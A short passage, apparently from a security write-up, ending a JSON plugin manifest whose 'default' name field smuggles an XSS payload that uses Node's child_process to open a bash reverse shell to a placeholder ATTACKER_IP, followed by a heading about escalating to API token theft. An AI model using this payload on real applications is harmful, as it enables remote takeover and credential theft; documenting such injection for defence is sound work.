        "default": "Helpful Plugin<img src=x onerror=\"require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\\"')\">"
    }
}
```

### Escalation: Data exfiltration (API token theft)

